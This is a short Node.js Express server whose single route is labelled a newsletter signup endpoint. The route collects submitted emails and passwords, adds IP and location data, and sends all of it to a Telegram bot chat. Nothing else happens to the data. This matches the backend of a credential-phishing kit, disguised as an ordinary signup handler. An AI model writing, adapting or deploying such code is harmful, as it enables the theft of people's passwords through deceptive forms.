import express from "express";
import cors from "cors";
import donenv from "dotenv";

donenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// Newsletter endpoint
app.post("/api/newsletter", async (req, res) => {
  try {
    const { email, password } = req.body;

    // Basic validation
    if (!email) {
      return res
        .status(400)
        .json({ success: false, message: "Email required" });
    }

    // Get visitor location
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    const message =
      `📩 New Newsletter Signup\n\n` +
      `👤 Password: ${password}\n` +
      `📧 Email: ${email}\n` +
      `📍 Location: ${ipData.city}, ${ipData.country_name}\n` +
      `🌐 IP: ${ipData.ip}\n` +
      `🕒 Time: ${new Date().toLocaleString()}`;

    // Send to Telegram
    await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text: message,
        }),
      },
    );

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});
